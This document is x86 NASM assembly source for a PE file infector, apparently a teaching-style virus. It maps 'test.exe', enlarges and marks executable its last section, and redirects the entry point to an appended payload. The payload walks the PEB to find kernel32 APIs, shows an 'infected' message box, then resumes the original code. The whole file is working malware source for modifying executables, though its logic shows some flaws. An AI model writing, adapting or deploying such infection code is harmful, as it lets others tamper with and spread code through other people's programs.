
[BITS 32]

extern CreateFileA
extern CloseHandle
extern CreateFileMappingA
extern GetFileSize
extern MapViewOfFile
extern FlushViewOfFile
extern UnmapViewOfFile	

SECTION .text
	global main

main:
	push ebp
	mov ebp, esp
	sub esp, 4			; File handle
	sub esp, 4			; File size
	sub esp, 4			; Mapping handle
	sub esp, 4			; Mapping address
	sub esp, 4			; Old entry point
	
	;	Create file
	xor edi, edi
	push edi			; hTemplateFile is NULL
	push edi			; dwFlagsAndAttributes = NULL mean any file
	push 0x3			; dwCreationDisposition = OPEN_EXISTING
	push edi			; security option should be 0
	push edi			; dwShareMode = 0 to prevent other processes from open file
	push 0xC0000000		; dwDesiredAccess = (GENERIC_READ | GENERIC_WRITE)
	push dword fname
		call CreateFileA
	mov dword [ebp-4], eax	; Save file handle
	
	;	get file size
	push edi
	push dword [ebp-4]
		call GetFileSize
	add eax, prog_sz		; New size = original size + prog size + extra
	add eax, 100h
	mov dword [ebp-8], eax	; Save file size
	
	;	Create mapping file
	xor edi, edi
	push edi		; Mapping file have no name
	push dword [ebp-8] ; dwMaximumSizeLow = file size 
	push edi		; dwMaximumSizeHigh == NULL
	push 0x04		; Open in readwrite
	push edi		; lpAttribute == NULL
	push dword [ebp-4]	; File handle
		call CreateFileMappingA
	mov [ebp-12], eax	; Save mapping handle
	
	;	Open map file
	push dword [ebp-8]	; dwNumberOfBytesToMap = filesize
	push edi			; file offset where the view begin == NULL
	push edi			; file offset where the view end == NULL
	push dword 2		; dwDesiredAccess = file map write
	push dword [ebp-12]	; file map handle
		call MapViewOfFile
	mov edx, eax
	mov [ebp-16], eax	; Save mapping address
	
begin_infection:
	
	;	Check for MZ header
	cmp	word [edx], 'MZ'
	jne	end_infection
	
	;	Check for real PE file
	add edx, dword [edx + 3ch]
	cmp word [edx], 'PE'
	jne end_infection
	
	;	Go to Section table
	mov esi, edx
	add esi, 18h
	movzx eax, word [edx + 14h]
	add esi, eax
	
	;	Get number of sections
	xor ecx, ecx
	mov cx, word [edx + 06h]	; Load number of sections
	mov edi, esi
	xor eax, eax
	push ecx
	
x_sections:
	cmp dword [edi + 14h], eax
	jz not_biggest
	mov ebx, ecx	; Put the number of sections in ebx
	mov eax, [edi + 14h]	; get pointer
not_biggest:
	add edi, 28h	; Go to next section
	loop x_sections
	
	pop cx		; substract to the
	sub ecx, ebx	; number of sections
	
	;	Go the the last section
	mov eax, 028h
	push edx	; Save PE header
	mul ecx
	pop edx
	add esi, eax	; esi save the offset of the last section
					; on section table
	
	;	Adjust VirtualSize to put prog in
	mov edi, [esi + 10h] ; Save PointerToRawData
	mov eax, prog_sz
	xadd [esi + 8h], eax ; exachange and add to destination
	push eax			 ; save VirtualSize before adding new code
	add  eax, prog_sz
	
	; Adjust SizeOfRawData
	push edx
	mov ecx, [edx + 03ch] ; Get alignment
	xor edx, edx
	div ecx		; Divide eax = last segment size + prog size by alignemnt
	xor edx, edx
	inc eax		; Plus 1 --> Round UP
	mul ecx		; multiply the alignment plus eax
	mov ecx, eax
	mov [esi + 10h], eax ; Update SizeOfRawData
	pop edx
	
	; Get the entry point
	pop ebx					; VirtualSize before adding prog_sz
	add ebx, [esi + 0ch]	; New entry point
	mov eax, [edx + 28h]	; Load old entry point
	mov [ebp-20], eax
	push ebx
	add eax, [edx + 34h]	; Add ImageBase to old entry point
	mov ebx, oep
	mov [ebx], eax			; Save entry point
	pop ebx
	mov [edx + 28h], ebx	; Set new entry point
	; Ajust overall file size
	sub ecx, edi
	add [edx+50h], ecx	; Add to SizeOfImage
	
	; Set last segment flags
	; 00000020 --> code
	; 20000000 --> executable
	; 80000000 --> writable
	or dword [esi + 24h], 0A0000020h
	
	; Copy code
	mov edi, [ebp-16]
	add edi, [esi + 14h]
	add edi, [esi + 8h]
	mov ecx, prog_sz
	sub edi, ecx		; Old length
	mov esi, prog_start
	rep movsb
	leave
	ret
	

end_infection:
	
	push dword [ebp-16]
		call FlushViewOfFile
	push dword [ebp-16]
		call UnmapViewOfFile
	push dword [ebp-12]
		call CloseHandle
	push dword [ebp-4]
		call CloseHandle

	leave
	ret

SECTION .data
prog_start:
	pushad
	call code_start
code_start:
	pop ebp
	sub ebp, code_start		;	Delta offset trick
	
	mov ebx, [fs:0x30]		;	Get pointer to PEB
	mov ebx, [ebx + 0x0C]	;	Get PEB->Ldr
	mov ebx, [ebx + 0x14]	;	Get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
	mov ebx, [ebx]			;	InMemoryOrder Module entry 2
	mov ebx, [ebx]			;	InMemoryOrder Module entry 3
	mov ebx, [ebx + 0x10]	;	Go to kernel32 base address
	mov [ebp+dwKernelBase], ebx		;	Save kernel32 base address
	add ebx, [ebx+0x3c]		;	Start of PE header
	mov ebx, [ebx+0x78]		;	RVA of export directory
	add ebx, [ebp+dwKernelBase]	;	VA of export directory
	mov [ebp+dwExportDirectory], ebx ;	Save dwExportDirectory
	
	; get GetProcAddress to get other module
	lea edx, [ebp+apiGetProcAddress]
	mov ecx, [ebp+lenGetProcAddress]
		call get_func_add
	mov [ebp+addGetProcAddress], eax
	
	; get LoadLibrary using GetProcAddress
	lea edx, [ebp+apiLoadLibrary]
	push edx
	push dword [ebp+dwKernelBase]
		call eax
	mov [ebp+addLoadLibrary], eax
	
	; use LoadLibrary to load User32.dll
	lea edx, [ebp+user32]
	push edx
		call eax 	; After call, eax hold base address of User32.dll load point
	
	; use GetProcAddress to load MessageBox from User32.dll which has jush been loaded
	lea edx, [ebp + apiMessageBox]
	push edx
	push eax
	mov ebx, [ebp+addGetProcAddress]
		call ebx
	mov [ebp+addMessageBox], eax
		
	; printf hello
	mov ebx, [ebp + addMessageBox]
	push 0
	lea eax, [ebp + tlt]
	push eax
	lea eax, [ebp + msg]
	push eax
	push 0
		call ebx
	
	
	; go to original entry point
	mov ebx, [ebp+oep]
	call ebx
	
	popad
	ret
	
get_func_add:
	push ebx
	push esi
	push edi
	
	mov esi, [ebp + dwExportDirectory]
	mov esi, [esi + 0x20]			; RVA of ENT
	add esi, [ebp + dwKernelBase]	; VA of ENT
	xor ebx, ebx
	cld
	
searcher:
	inc ebx
	lodsd
	add eax, [ebp + dwKernelBase]	; point to string of a function
	push esi						; preserve for outer loop
	mov esi, eax
	mov edi, edx
	cld
	push ecx
	repe cmpsb						; Check function name
	pop ecx
	pop esi
	jne searcher
	
	dec ebx
	mov eax, [ebp+dwExportDirectory]
	mov eax, [eax + 0x24]			; RVA of EOT
	add eax, [ebp + dwKernelBase] 	; VA of EOT
	movzx eax, word [ebx*2 + eax]	; eax holds the oridinal of function
	mov ebx, [ebp+dwExportDirectory]
	mov ebx, [ebx + 0x1C]			; RVA of EAT
	add ebx, [ebp + dwKernelBase]	; VA of EAT
	mov ebx, [eax*4 + ebx]
	add ebx, [ebp + dwKernelBase]
	mov eax, ebx
	pop	edi
	pop	esi
	pop ebx
	ret
	
	;	Data
	tlt db "Warning", 0
	msg db "This file has been infected.", 10, 0
	user32 db "User32.dll", 0
	dwKernelBase	dd	0
	dwExportDirectory dd 0
	oep dd 0
	;	Kernel API
_kernel_API:
	apiMessageBox	db	"MessageBoxA", 0
	addMessageBox dd 0
	apiGetProcAddress	db	"GetProcAddress"
	lenGetProcAddress	dd	$ - apiGetProcAddress
	addGetProcAddress dd 0
	apiLoadLibrary db "LoadLibraryA", 0
	addLoadLibrary dd 0
	
prog_end:



	fname db "test.exe", 0
	prog_sz equ prog_end - prog_start
